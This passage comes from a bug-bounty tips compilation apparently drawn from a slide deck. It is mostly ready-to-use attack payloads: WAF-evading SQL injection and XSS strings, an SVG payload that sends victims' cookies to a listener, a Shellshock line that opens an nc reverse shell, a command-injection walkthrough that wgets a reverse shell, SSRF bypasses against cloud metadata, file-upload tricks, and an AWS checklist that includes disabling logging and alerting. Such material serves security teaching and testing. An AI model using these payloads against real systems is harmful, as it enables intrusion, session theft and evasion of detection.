**Slide:** 28/116

```sql
/*!50000un0x696fn*//*!12345A11*//(*!50000se0x6c65ct*//+1)+-
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
/*!12345#qa%0A#%0AUnIon*/ (/*!12345#qa%0A#%0ASeLeCt*//**/1)+
```

<!-- unclear: the payload lines run past the right edge of the slide and are truncated in the source -->

**Why it matters:** MySQL versioned comments (`/*!50000...*/`) and inline comment noise break naive WAF signatures while the database still parses them.

---

### 64. Reflected XSS Approach (Mind Map)

**Slide:** 48/116

- **Finding XSS**
  - **Offline tools** — `xssjun` for parameter discovery
  - **Online tools** — `https://domxssscanner.geeksta.net/`, `https://xsshunter.com/`
  - **Reflected XSS** — submit a benign alphanumeric string in every entry point; identify all locations where the string is reflected; identify the syntactic context in which the reflected data appears; then jump to the exploitation side of this map, following it top to bottom
- **Identifying Reflections of User Input**
  - Choose a unique string that doesn't appear anywhere in the application and includes only alphanumeric characters that won't be altered
  - Submit it as every parameter, one at a time, including GET, POST, query string and headers such as `User-Agent`
  - Monitor the response for the appearance of the string
- **Exploitation**
  - **Basic approach** — insert a normal payload to test:
    - `><script>alert(document.domain)</script>`
    - `"><svg/onload=alert(document.domain)>`
  - **Simple attack fails** — check for allowed and blocked characters and make custom payloads:
    - `%3c%3cscript%3ealert(document.domain)%3c/script%3e`
    - `%00"<script>alert(document.domain)</script>`
    - Customize the payload by removing the part which caused the error
  - **When input string is sanitized, decoded, or otherwise modified** — probe defensive filters:
    - The application has identified your attack and blocked your input
    - The application has accepted your input but has performed some kind of sanitization or encoding on the attack string
    - The application has truncated your attack string to some fixed maximum length input
- **Creating Payload**
  - **If one tag has been blocked, try the others**
  - **Use event handlers** — `<tag onxxx=xxx>alert(document.domain)</tag>`
  - **Script pseudo-protocols** — dynamically evaluated styles
  - **Bypassing filters**
    - Use a combination of upper and lowercase
    - Insert null byte (`%00`) at any position
    - Use an invalid tag — `<x onclick=alert() src=a>Click here</a>`
    - Use base and/or relative-path URLs that will be resolved relative to it (aka base-tag hijacking) — `<base href="http://attacker.net/badsite"/>`
    - Insert space following the tag name
    - Replace the space with other characters or any junk
    - Add extra characters when there is no space
    - Insert null byte (`%00`) in attribute name — `<img%00onerror=alert()> src=x>`
    - Attack with no space — `<img/onload="alert()"src=x>`
    - Use attribute delimiters — `<img src='a'onerror=alert()>`
    - Insert HTML-encoded characters — use decimal and hexadecimal format, add leading zeros, omit trailing semicolon:
      - `<iframe src=javascript&#x3a;//pt:&lt;a&gt;alert&lpar;&rpar;>`
      - `<img onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;>`
    - **Tag brackets** — some applications perform URL decoding once or twice or as per their need; some app frameworks translate unusual Unicode characters into their nearest ASCII equivalents, so double-angle-quote marks `%u00AB` and `%u00BB` work:
      - `«img onerror=alert()» src=x>`
      - `<script>alert(1)</»</script>`
      - `<script>alert(1)</script>` (strange but true in Firefox)
    - **Character set** — UTF-7 (`+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-`), US-ASCII (`%u003cscript%u003ealert()%u003c/script%u003e`), UTF-16; tell the browser the character type via the HTTP `Content-Type` header, an `HTTP META` tag, or the `CHARSET` parameter
  - **XSS polyglots** — `https://github.com/0xR0/xss-polyglot-payload-generator.html`

**Why it matters:** Reflected XSS is a loop: find the reflection, learn the parser's context and filters, then adapt the payload until the browser executes it.

---

### 65. SVG `onload` Payload — Cookie Exfiltration

**Source:** @trbughunters · **Slide:** 52/116

```html
"><svg onx=() onload=(location.href='<BIN>/?mycookies='+document['cookie'])()>
```

**Why it matters:** The handler sends the victim's cookie to a listener, which is all you need to demonstrate impact when HttpOnly is missing.

---

### 66. XSS Firewall Bypass Techniques

**Source:** @sratarun · **Slide:** 65/116

1. Check if the firewall is blocking only lowercase.

```html
Ex: <sCRiPt>alert(1)</sCRiPt>
```

2. Try to break the firewall regex with a new line (`\r\n`).

```html
Ex: <script>%0aalert(1)</script>
```

3. Try double encoding.

```text
Ex: %2522
```

4. Testing for recursive filters — if the firewall removes text in red, we will have a clean payload.

```html
Ex: <scr<script>ipt>alert(1);</scr</script>ipt>
```

5. Injecting an anchor tag without whitespaces.

```html
Ex: <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;r&Tab;ipt:alert&lpar;1&rpar;">
```

6. Try to bypass whitespaces using bullet.

```html
Ex: <svg•onload=alert(1)>
```

7. Try to change the request method.

```http
Ex: GET /?q=xss      POST /
                        q=xss
```

**Why it matters:** Filters are usually regex-based on a single canonical form; case, encoding, newlines, and tag splitting break that assumption.

---

### 67. Gadget Roundup — reCAPTCHA, Angular Path Traversal, DOMPurify Bypass

**Slide:** 70/116

reCAPTCHA gadget:

```html
<!-- reCAPTCHA gadget -->
<button class="g-recaptcha" data-sitekey="1337" data-error-callback="alert">
```

Angular path traversal:

```http
<!-- Angular Path Traversal -->
GET / HTTP/1.1
HOST: \secret\path
```

DOMPurify bypass:

```html
<!-- DOMPurify Bypass -->
<math><mtext><table><mglyph><style><img src=x onerror=alert()>
```

**Why it matters:** These are three separate classes of bypass — a library callback gadget, client-side route normalization, and a sanitizer parser-differential.

---

### 68. XSS Methods for Beginners

**Source:** @sratarun · **Slide:** 75/116

```text
Xss_Methods_For_beginner

Try ?q=xss"<
2 reflection found :
1- <p>xss&quot;&lt;</p>  2- <input type="text" value="xss&quot;"> -----> bypass
   "onfocus=alert(1)"autofocus="x

output : <input type="text" value="xss"onfocus=alert(1)"autofocus="x&quot; >
------------------------------------------------------------
Try ?q=xss"<
reflection found :
<script>var q= xss\"&lt;</script> -----> bypass \"-alert(1)-"

output : <script>var q="xss\"-alert(1)-";&lt;</script>
------------------------------------------------------------
if block "\" & work "<" --> How to bypass ? .....
bypass --> xss\"</script/x><svg/onload=alert`1`>

Output: --> <script>var q="xss\"</script/x><svg/onload=alert`1`></script>
------------------------------------------------------------
Try ?q=xss"<
if Block = xss"< ..Hmm ---> Check Html tags (<h1>test</h1>).
------------------------------------------------------------
does not work anything...
How to bypass ?
Try .. -----> ({{7*7}}) --> response 49 ---> try angular js xss
```

**Why it matters:** Each reflection sits in a different context, so the payload must break out of an attribute, a JS string, or a tag — depending on what the response shows.

---

### 69. DOMPurify / mXSS Parser Confusion

**Slide:** 76/116

Input:

```html
Input:
<math>
  <mtext>
    <table>
      <mglyph>
        <style><!--</style>
          <img title="--&gt;&lt; img src=1 onerror=alert(1)&gt; ">
```

Output:

```html
Output:
<math>
  <mtext>
    <mglyph>
      <style><!--</style>
        <img title="--></style></mglyph><img src="1" onerror="alert(1)">&gt;
    <table>
    </table>
  </mtext>
</math>
```

Notes from the slide:

- Table gets re-ordered in the DOM.
- In HTML-based style, comments are ignored, but because the table is re-ordered, the comment becomes a math-based style and the comment is not ignored.
- Because the HTML parser is confused, it decodes the HTML and inserts closing style and mglyph.
- Image gets decoded and will render because the comment is a math-based style and the comment is active.

**Why it matters:** Sanitizing the string and parsing the DOM are two different grammars; re-ordering creates markup the sanitizer never saw.

---

### 70. Mutation Points in the `<a>` Tag for WAF Bypass

**Source:** @hackerscrolls · **Slide:** 77/116

```html
<a[1]href[2]=[3]"[4]java[5]script:[6]alert(1)">
```

| Point | Bytes | Allowed encoding |
|-------|-------|------------------|
| `[1]` | `\x09 \x0a \x0b \x0c \x0d \x20 \x2f` | HTML |
| `[2]` | `\x09 \x0a \x0c \x0d \x20` | HTML |
| `[3]` | `\x09 \x0a \x0d` | HTML |
| `[4]` | `\x09 \x0a \x0c \x0d \x20 \x21 \x2b \x24 \x3b \x7e \x0a` and `\x02 \x03 \x04 \x05 \x06 \x07 \x08 \x09 \x0b \x0c \x0e \x0f \x10 \x11 \x12 \x13 \x14 \x15 \x16 \x17 \x18 \x19 \x1a \x1b \x1c \x1e \x1f \x20` | HTML |
| `[5]` | `\u2000 \u2001 \u2002 \u2003 \u2004 \u2005 \u2006 \u2007 \u2008 \u2009 \u200a \u2028 \u2029 \u202f \u205f \u3000 \ufeff` | HTML, URL |
| `[6]` | `\x09 \x0a \x0b \x0c \x0d \x20 \x21 \x2b \x24 \x3b \x7e \x0a` | HTML |

How to use it:

```html
[1] <a/href="javascript:alert(1)">
    <a%0ahref="javascript:alert(1)">
[2,3] <a href="x"e>javascript:alert(1)</a>
      <a href="x"e>javascript:alert(1)</a>
[4] <a href="&#6Tab;javascript:alert(1)">
    <a href="&#x00;1;javascript:alert(1)">
[5] <a href="&#8203;javascript:alert(1)">
    <a href="&Tab;javascript:alert(1)">
[6] <a href="javascript:alert(1)">
    <a href="javascript&colon;alert(1)">
    <a href="javascript&#0000058alert(1)">
    <a href="javascript&#58alert(1)">
    <a href="javascript&COLON;alert(1)">
```

Notes on the right side:

```
We use char codes to show
non printable symbols
\x00 - ASCII hex code
\x20 - SPACE
\x0a - NEW LINE
\u0000 - UTF-8 char code
\u1680 - OGHAM SPACE MARK
\u2028 - LINE SEPARATOR
Encoding UTF-8 to URL
left unaffected.
Examples:
\x20 -> %20
\u1680 -> %e1%9a%80
```

**Why it matters:** Browsers ignore tabs, newlines, and Unicode spaces inside a URL scheme, so the same `javascript:` URL can be written dozens of ways.

---

### 71. Shellshock Test on CGI (`cgi-bin`)

**Slide:** 86/116

Test on CGI (`cgi-bin`):

```http
User-Agent: () { :;}; echo $(</etc/passwd)
```

```http
() { :;}; /usr/bin/nc ip 1337 -e /bin/bash
```

**Why it matters:** An outdated Bash parses function definitions in environment variables such as `User-Agent`, so the trailing command executes.

---

### 72. Command Injection — Spaces Blocked, Dots Blocked

**Slide:** 91/116

```
!!! Found A Command Injection!!!
```

1. Command can be executed inside `;`:

```bash
;whoami;
```

2. But we cannot add `<space>` for a command:

```bash
cat /etc/passwd won't work, since it contains <space> in between.
${IFS} can be used instead of <space>, so the command will be
cat${IFS}/etc/passwd
```

3. Tried to upload a reverse shell but `.` (dot) is not allowed:
   - Converted IP to decimal and it worked.
   - Command used to upload shell:

```bash
;wget${IFS}http://168377863/rev.php;
```

Here, `168377863` is my IP `10.9.62.7` (decimal form).

**Why it matters:** `${IFS}` replaces spaces and a decimal IP replaces dots, so both character filters are bypassed with valid shell syntax.

---

## SSRF & Network

<details>
<summary>Show tips in this section</summary>

- [73. SSRF Search & Destroy (Mind Map)](#73-ssrf-search--destroy-mind-map)
- [74. Top 25 SSRF Dorks](#74-top-25-ssrf-dorks)
- [75. Vulnerabilities Emerging with `xmlrpc.php` Pingback Module](#75-vulnerabilities-emerging-with-xmlrpcphp-pingback-module)
- [76. SSRF Tip — Build a Wordlist from JavaScript](#76-ssrf-tip--build-a-wordlist-from-javascript)

</details>

### 73. SSRF Search & Destroy (Mind Map)

**Source:** @hackerScrolls · **Slide:** 4/116

- **Bypass block list**
  - **URL Parser Logic** — `http://evil@google.com`, `http://127.1.1.80@127.2.2.80/`, `http://127.1.1.80@@127.2.2.80/`, `0//evil.com:80.http://google.com:80/`
  - **Unicode Normalization** — `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`
  - **Address encoding** — Octal `http://0177.0.0.1`, Decimal `http://2130706433/`, Hex `http://0x7f.0x0.0x0.0x1`, Mixed `http://0177.0x0.0x1`
  - **Localhost Representation** — `http://0/`, `http://127.1`, `http://0.0.0`, `http://127.127.127.127`
  - **IPv6 Address** — `http://[::]:80`, `http://[::1]:80`, `http://[0000::1:80]/`, `http://[::1]/server-status`
- **Redirect**
  - Redirect via controlled site — `Location: http://127.0.0.1`
  - Redirect with scheme changing — `Location: gopher://127.0.0.1:11211/_data`
  - Chain of redirects via controlled site
  - Open Redirect to allowed domain — `target.com/url=http://127.0.0.1`
  - Bypass redirect protection
  - Check various response codes: `201, 301, 302, 303, 307, 308`
- **Attacks**
  - **Attacks on SSRF client** — SSRF to XXE; Fingerprint SSRF client
  - **Bypass restrictions** — Internal API, 403 restrictions, Access to admin panel
  - **File read** — `/proc/self/environ`, `C:/Windows/win.ini`, `Application log files`, `Application config files`
  - **SSRF to XSS**
  - **Cloud meta API** — AWS (`169.254.169.254/latest/user-data`, `169.254.169.254/latest/meta-data/hostname`, `169.254.169.254/latest/meta-data/ami-id`), if metadata v1 enabled; check target IP to find out cloud provider
  - **Internal network recon** — Port scanning using errors or time delay; fingerprint known HTTP services; blind SSRF port scanning via DNS; blind SSRF exploitation by Wallarm
- **DNS**
  - **DNS pinning** — `evil.com -> 127.0.0.1`, `evil.com -> 169.254.169.254`
  - **DNS rebinding** — check tool `http://u.nu/`
  - **Known public DNS pinning** — `localtest.me`, `169.254.169.254.xip.io`, `spoofed.burpcollaborator.net`, find target domain with a `127.0.0.1` A record
- **Schemas**
  - **FTP** — `ftp`, `ftps`, `sftp` — UNC paths: `\\127.0.0.1@C:\Windows\win.ini`; file read: `\\evil.com\share` → NTLM hash leakage
  - **HTTP/HTTPS** — file read: `file:///etc/passwd`, `netdoc:///etc/passwd`
  - **Other** — `jar`, `dict`, `gopher` (Java only), `ldap` (almost deprecated)
- **Where to find?**
  - **File processing** — HTML/PDF/image rendering; SSRF via FFmpeg AVI/M3U8; `XXE: xml, docx, odt`; SSRF via SVG (`https://github.com/allanlw/svg-cheatsheet`); headers host, referer, X-Forwarded-For
  - **Callbacks** — GET `evil.com HTTP/1.1`
  - **Upload image/file by URL**
  - **URL preview**
  - **Brute GET/POST to internal SSRF params**
  - **Reverse proxies / load balancers** — "Cracking the lens" by James Kettle
  - Tools: `ffuf`, `ffuf`, `Turbo`

**Why it matters:** This map is a checklist for the two halves of SSRF work — finding a URL-accepting feature, then getting past the allowlist, DNS, and protocol restrictions.

---

### 74. Top 25 SSRF Dorks

**Source:** @trbughunters · **Slide:** 19/116

```text
1.  ?dest={target}
2.  ?redirect={target}
3.  ?uri={target}
4.  ?path={target}
5.  ?continue={target}
6.  ?url={target}
7.  ?window={target}
8.  ?next={target}
9.  ?data={target}
10. ?reference={target}
11. ?site={target}
12. ?html={target}
13. ?val={target}
14. ?validate={target}
15. ?domain={target}
16. ?callback={target}
17. ?return={target}
18. ?page={target}
19. ?feed={target}
20. ?host={target}
21. ?port={target}
22. ?to={target}
23. ?out={target}
24. ?view={target}
25. ?dir={target}
```

Note: the popularity of dorks can vary.

**Why it matters:** Parameter names hint at server-side fetches; `{target}` should be replaced with a collaborator URL to confirm the request comes from the server.

---

### 75. Vulnerabilities Emerging with `xmlrpc.php` Pingback Module

**Source:** @trbughunters · **Slide:** 37/116

1. **Distributed denial-of-service (DDoS) attacks:** An attacker executes the `pingback.ping` method from several affected WordPress installations against a single unprotected target (botnet level).
2. **Cloudflare protection bypass:** An attacker executes the `pingback.ping` method from a single affected WordPress installation which is protected by Cloudflare to an attacker-controlled public host (for example a VPS) in order to reveal the public IP of the target, therefore bypassing any DNS level protection.
3. **XSPA (Cross Site Port Attack):** An attacker can execute the `pingback.ping` method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.

**Why it matters:** Pingback makes the WordPress host issue an outbound HTTP request to a URL you choose — the classic SSRF primitive.

---

### 76. SSRF Tip — Build a Wordlist from JavaScript

**Slide:** 45/116

```bash
# Collect .js files
subfinder -d <domain> -silent -all | httpx | getJS -complete | tee -a <domain>.js

# Collect Endpoints
cat <domain>.js | linkJs -m endpoints | tee -a endpoints.txt

# Construct a wordlist
./wordlistgen endpoints.txt parameters.txt | tee -a wordlist

# Should be in the format
/endpoint/?url=FUZZ

Run FFUF against the domain and wordlist
```

**Why it matters:** Front-end bundles leak internal endpoints and parameters, which become the fuzzing list for SSRF-capable URL parameters.

---

## File Upload & Traversal

<details>
<summary>Show tips in this section</summary>

- [77. What You Can Reach With an Uploaded File](#77-what-you-can-reach-with-an-uploaded-file)
- [78. Top 25 LFI (Local File Inclusion) Parameters](#78-top-25-lfi-local-file-inclusion-parameters)
- [79. File Upload Leads to SVG XSS](#79-file-upload-leads-to-svg-xss)
- [80. Bypassing Most File Upload Filters](#80-bypassing-most-file-upload-filters)

</details>

### 77. What You Can Reach With an Uploaded File

**Source:** @SalahHasoneh1 · **Slide:** 12/116

| # | Extension | Impact |
|---|-----------|--------|
| 1 | ASP / ASPX / PHP5 / PHP / PHP3 | Webshell / RCE |
| 2 | SVG | Stored XSS / SSRF |
| 3 | GIF | Stored XSS |
| 4 | CSV | CSV injection |
| 5 | XML | XXE |
| 6 | AVI | LFI / SSRF |
| 7 | HTML/JS | HTML injection / XSS / open redirect |
| 8 | PNG/JPEG | Pixel flood attack |
| 9 | ZIP | RCE via LFI |
| 10 | PDF/PPTX | SSRF / blind XXE |

**Why it matters:** The extension allowlist, not the upload form, is what decides whether an "image upload" can become code execution.

---

### 78. Top 25 LFI (Local File Inclusion) Parameters

**Source:** @trbughunters · **Slide:** 40/116

```text
1.  ?cat={payload}
2.  ?dir={payload}
3.  ?action={payload}
4.  ?board={payload}
5.  ?date={payload}
6.  ?detail={payload}
7.  ?file={payload}
8.  ?download={payload}
9.  ?path={payload}
10. ?folder={payload}
11. ?prefix={payload}
12. ?include={payload}
13. ?page={payload}
14. ?inc={payload}
15. ?locate={payload}
16. ?show={payload}
17. ?doc={payload}
18. ?site={payload}
19. ?type={payload}
20. ?view={payload}
21. ?content={payload}
22. ?document={payload}
23. ?layout={payload}
24. ?mod={payload}
25. ?conf={payload}
```

**Why it matters:** Template, language, and download parameters are the usual places where user input becomes a file path.

---

### 79. File Upload Leads to SVG XSS

**Source:** "Mahendra" · **Slide:** 41/116

> SVG enable required: you can check manually by uploading an SVG, or use the Retire.js extension in your browser — sometimes it helps to detect.

1. Create a text file, bind the code below, then save as `.svg`.

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(Hacked);
  </script>
</svg>
```

2. Now upload this file and then open the SVG image location.
3. If it's vulnerable, then the popup comes.

**Why it matters:** An SVG is XML that can carry `<script>`, so serving an uploaded SVG from the app's origin turns image upload into stored XSS.

---

### 80. Bypassing Most File Upload Filters

**Source:** @offensivekrish (hackergenix.com) · **Slide:** 71/116

```text
🚀 Bypassing most FILE Uploads filters 🔒

* .htaccess           <- upload htaccess
* * file.svg          <- uploading svg = xss
* file.SVg            <- must try case mismatch
* * file.png.svg
* file.php%00.png
* * file.png' or '1'='1
* ../../file.png
* * file.'svg          <- Invalid File Extension
```

**Why it matters:** Each line attacks a different validation mistake: server config upload, double extensions, null bytes, case, and path traversal.

---

## API & GraphQL

<details>
<summary>Show tips in this section</summary>

- [81. Sensitive Data Leakage Using `.json`](#81-sensitive-data-leakage-using-json)
- [82. API Endpoint Wordlist from a Banking App](#82-api-endpoint-wordlist-from-a-banking-app)

</details>

### 81. Sensitive Data Leakage Using `.json`

**Source:** @SalahHasoneh1 · **Tags:** #BugBountyTips · **Slide:** 2/116

Appending `.json` to an endpoint made it return a JSON body instead of the HTML page — and that body contained a password-reset token.

Request:

```http
GET /ResetPassword HTTP/1.1
{"email":"victim@example.com"}
```

Response:

```http
HTTP/1.1 200 OK
```

Request:

```http
GET /ResetPassword.json HTTP/1.1
{"email":"victim@example.com"}
```

Response:

```http
HTTP/1.1 200 OK
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
```

**Why it matters:** Content negotiation with an unexpected extension (`.json`, `.xml`, `.txt`) can bypass the view layer and expose data the HTML response hides.

---

### 82. API Endpoint Wordlist from a Banking App

**Slide:** 88/116

```text
https://api.        .com/robo/api/questionnaire
https://api.        .com/internal/v1/orders/mutualfunds/bulk/subscription
https://api.        .com/robo/assetAllocation/topupDistribution
https://api.        .com/robo/assetAllocation/targetPortfolio
https://api.        .com/internal/v1/orders/mutualfunds/robo
https://apiapps.    .com/web/v1/articles/Search
https://apiapps.    .com/rdo/v1/user/sendSmsToken
https://apiapps.    .com/rdo/v1/sendSmsTokenRegister
https://apiapps.    .com/rdo/v1/user/verification/send
https://apiapps.    .com/web/v1/mutualfund/getSimulation
https://cdn-apiapps.    .com/rdo/v1/getStaticMasters
https://apiapps.    .com/rdo/v2/user/profile/bank/add
https://apiapps.    .com/web/v1/bfa
https://apiapps.    .com/rdo/v1/user/change-password
https://apiapps.    .com/rdo/v2/order/confirmation
https://apiapps.    .com/rdo/v2/order/redemption
https://apiapps.    .com/rdo/v1/order/subscription
https://apiapps.    .com/rdo/v1/order/switching
https://apiapps.    .com/rdo/v2/user/profile/update/new
https://apiapps.    .com/rdo/v2/user/profile/bank/update
https://apiapps.    .com/web/v1
https://cdn-apiapps.    .com/web/v1/mutualfund/topReturn
```

**Why it matters:** Endpoint names harvested from one app become a targeted wordlist for sibling apps on the same infrastructure.

---

## Cloud & Storage

<details>
<summary>Show tips in this section</summary>

- [83. AWS Penetration Testing Checklist](#83-aws-penetration-testing-checklist)

</details>

### 83. AWS Penetration Testing Checklist

**Source:** @Tushar Verma · **Slide:** 57/116

1. Test for unauthenticated bucket access.
2. Test for semi-public bucket access — improper ACL permission.
3. Targeting and compromising AWS access keys in git commit.
4. Test for extracting keys from an EC2 instance.
5. Exploiting AWS security misconfigurations.
6. Testing to exploit an EC2 instance.
7. Exploiting internal AWS services using Lambda backdoors.
8. Test for subdomain takeover.
9. Testing for AWS IAM privilege escalation.
10. Test for RCE attack.
11. Test for AWS role enumeration (IAM).
12. Test for the EC2 service to exploit privilege escalation.
13. Test for AWS IAM enumeration: bypassing CloudTrail logging.
14. Test for BitBucket server data for credentials in AWS.
15. DNS rebinding to compromise the cloud environment.
16. Test for change of local Windows / Linux logs.
17. Test to create jobs or serverless actions to add root certificates and SSH private keys to machines and users (such as **AWS Lambda**).
18. Test to create an additional interface / assign an IP address in the target network / subnet on a compromised machine (like assigning a secondary private IPv4 address or interface to an AWS EC2 instance).
19. Steal virtual machine images from storage accounts, analyze them for passwords, keys and certificates to access live systems (like **VM VHD snapshots** from storage accounts).
20. Test to gain OS-level access to instances/VMs via workload management service privileges (**AWS SSM**).
21. Create systems management commands or abuse instance metadata for scheduled and triggered command and control (**AWS Systems Manager**, modify **EC2 UserData** to trigger a reverse shell).
22. Test to run or deploy a workload with an assigned/passed service or role, export instance credentials for those privileges (such as **EC2 passed role and meta credentials**).
23. Fingerprint server and application versions and frameworks, detect sensitive PII in application logs.
24. Test for CSV injection in AWS CloudTrail.
25. Tested for AWS secrets accessible via meta-data.
26. Attempt load balancer MitM for session hijacking (**ELB**) by cloud service configuration or load balancer instance compromise.
27. Steal credentials from metadata of proxy or HTTP forwarding servers (credentials in AWS meta).
28. Steal cloud workload credentials (**AWS metadata STS** or **Azure Linux Agent (waagent)** folder credentials).
29. Steal credentials from or leverage privilege to operation of a cloud key service (**AWS KMS**, **Azure Key Vault**).
30. Alter data in datastore for fraudulent transactions or static website compromise (**S3, RDS, Redshift**).
31. Alter a serverless function, logic app or otherwise a business logic implementation for action on objective or escalation (**AWS Lambda or Azure Logic Apps**).
32. Alter data in local SQL or MySQL databases.
33. Operate in regions where logging is not enabled or disable global logging (like CloudTrail).
34. Alter log files in a non-validated log store or disable validation (like CloudTrail log validation).
35. Tested for disable network traffic analysis / logging (**VPC flowlogs**).
36. Tested for disable cloud alerting to prevent detection and response (like **CloudWatch alerts, GuardDuty, Security Hub, or Azure Security Center**).
37. Tested for disable data store access logging to prevent detection and response (**CloudTrail data access, S3 access logging, Redshift user activity**).
38. Alter log retention or damage the integrity of logs (**S3 lifecycle, KMS decryption CMK key deletion/role privilege lockout**).
39. Process hooking, process injection, Windows access token manipulation, leveraging misconfigured sudo capabilities.
40. Test to create or reset a login, access key or temporary credential belonging to a high-privilege user (like **iam:CreateAccessKey, sts or iam:UpdateLoginProfile**).
41. Test to change the default policy for a user or new users to include additional privileges (like **setdefault-policy-version**).

**Why it matters:** A checklist that maps cloud attack paths from initial key exposure through persistence, logging evasion, and privilege escalation.

---

## Client-Side

<details>
<summary>Show tips in this section</summary>

- [84. Path Normalization and Open Redirect Probing](#84-path-normalization-and-open-redirect-probing)
- [85. CORS Protection RegEx Bypass](#85-cors-protection-regex-bypass)
- [86. Cross-Site Request Forgery (CSRF) Checklist](#86-cross-site-request-forgery-csrf-checklist)
- [87. `oralyzer.py` — Open Redirect Scanner](#87-oralyzerpy--open-redirect-scanner)
- [88. Open Redirection Best Payloads](#88-open-redirection-best-payloads)
- [89. CSRF — Adding an Attacker Email to a Victim Account](#89-csrf--adding-an-attacker-email-to-a-victim-account)
- [90. Top 15 DOM-Based Open URL Parameters](#90-top-15-dom-based-open-url-parameters)

</details>

### 84. Path Normalization and Open Redirect Probing

**Slide:** 1/116

Probe how the server normalizes duplicate slashes and userinfo in paths. The status codes and `Location` values reveal differing parsing between the front end, proxies, and the redirect handler:

```http
https://example.com/dir -> [ 200 ]
https://example.com//dir -> http://dir [ 302 ]
https://example.com//dir/anypage.com -> http://dir/anypage.com [ 302 ]
https://example.com//dir/anypage -> http://dir/anypage [ 302 ]
https://example.com//dir@evil.com -> [ 404 ]
https://example.com//evil.com -> [ 404 ]
```

**Why it matters:** A `302` to an attacker-controlled host proves the redirect logic trusts the path after `//`, and the `404` cases show which `@`-style tricks the stack rejects.

---

### 85. CORS Protection RegEx Bypass

**Source:** @trbughunters · **Slide:** 31/116

If the target only allows main-domain and subdomains, try to write something at the beginning of the main-domain.

```text
Origin: target.com          --> Access-Control-Allow-Origin: target.com
Origin: eviltarget.com      --> Not Vulnerable
Origin: sub.eviltarget.com  --> Access-Control-Allow-Origin: sub.eviltarget.com
```

Note: this trick has been tried before and triggered.

**Why it matters:** A regex like `target\.com$` matches `eviltarget.com` too, so any attacker-owned domain ending in the target's name is trusted.

---

### 86. Cross-Site Request Forgery (CSRF) Checklist

**Slide:** 49/116

- **Cross-Site Request Forgery (CSRF)**
  - Change request method `[GET => POST]` or `[POST => GET]`
  - Remove total token parameter
  - Remove the token, and give a blank parameter
  - Copy an unused valid token — by dropping the request and use that token
  - Replace value with one of the same length
  - Reverse engineer the token
  - Extract token via HTML injection
  - Switch from non-form `Content-Type: application/json` or `Content-Type: application/x-www-form-urlencoded` to `Content-Type: form-multipart`

**Why it matters:** Token validation often fails open on method changes, blank values, duplicated tokens, or an unexpected content type.

---

### 87. `oralyzer.py` — Open Redirect Scanner

**Slide:** 58/116

Single target:

```bash
python3 oralyzer.py -u http://example.com/redir?url=
```

Multiple targets:

```bash
python3 oralyzer.py -f urls.txt
```

Use a custom payload list:

```bash
python3 oralyzer.py -u http://example.com/redir?url= --payload payloads.txt
```

Use a proxy:

```bash
python3 oralyzer.py -u http://example.com/redir?url= --proxy 204.32.56.129:8080
```

Fetch URLs from archive.org:

```bash
python3 oralyzer.py -u http://www.example.com --wayback
```

**Why it matters:** It automates payload rotation for redirect parameters and can pull historical URLs from the Wayback Machine.

---

### 88. Open Redirection Best Payloads

**Source:** @x_bug_community · **Tags:** #crypto · **Slide:** 64/116

```text
/%09/google.com
/%5cgoogle.com
//www.google.com/%2f%2e%2e
//www.google.com/%2e%2e
//google.com/
//google.com/%2f..
//\google.com
/\victim.com:80%40google.com
```

**Why it matters:** Encoded slashes, backslashes, path traversal, and userinfo (`@`) each defeat a different redirect validator.

---

### 89. CSRF — Adding an Attacker Email to a Victim Account

**Slide:** 68/116

Let's suppose an attacker has the email address `attacker@gmail.com` and wants to add this email address to the victim's account via CSRF. They have to follow these steps:

1. First, add this email address `attacker@gmail.com` to their own account the intended way and confirm it via the confirmation link.
2. Then remove this email address — now the email address is ready to be used in a CSRF exploit.
3. Now the attacker just has to make a CSRF exploit with the `attacker@gmail.com` email address and send it to the victim.
4. When the victim runs the exploit, the attacker will receive a confirmation link on their email address.
5. The attacker will change the value of the `redirect` parameter to `/home` and send it to the victim.
6. When the victim opens the confirmation link, the attacker's email address will be added to the victim's account without that pop-up notification, because the victim will go to the home page instead of the profile settings page.

**Why it matters:** Pre-verifying the attacker's address defeats the "must confirm your email" control, and the redirect hides the change from the victim.

---

### 90. Top 15 DOM-Based Open URL Parameters

**Source:** @offensivekrish (hackergenix.com) · **Slide:** 82/116

```text
🚀 Top 15 DOM base open URL parameter 🔒

1.  location
2.  location.host
3.  location.hostname
4.  location.href
5.  location.pathname
6.  location.search
7.  location.protocol
8.  location.assign()
9.  location.replace()
10. open()
11. domElem.srcdoc
12. jQuery.ajax()
13. $.ajax()
14. XMLHttpRequest.open()
15. XMLHttpRequest.send()
```

**Why it matters:** These sinks turn attacker-controlled input into navigation or request destinations when the source is `location` or a URL parameter.

---

## Business Logic

<details>
<summary>Show tips in this section</summary>

- [91. Price Manipulation Method 2 — Negative Quantity](#91-price-manipulation-method-2--negative-quantity)
- [92. Price Manipulation Method 1 — Fractional Quantity](#92-price-manipulation-method-1--fractional-quantity)
- [93. Application Logic Bugs Are Important](#93-application-logic-bugs-are-important)

</details>

### 91. Price Manipulation Method 2 — Negative Quantity

**Source:** @SalahHasoneh1 · **Tags:** #BugBountyTips · **Slide:** 15/116

1. Add two products to the basket [let's consider a single product $40].
2. If the request is processed in this way:

```json
{"items":{"laptop":1,"mobile":1}}
```

3. Change the JSON body to:

```json
{"items":{"laptop":4,"mobile":-2}}
```

4. The cost will become $20 for two items: `4 * $40 - 2 * $70 = $160 - $140 = $20`.

**Why it matters:** Server-side price recalculation trusts the quantity field, so a negative quantity subtracts money from the total.

---

### 92. Price Manipulation Method 1 — Fractional Quantity

**Source:** @SalahHasoneh1 · **Tags:** #BugBountyTips · **Slide:** 16/116

If the product price parameter cannot be changed, change the quantity of products:

```text
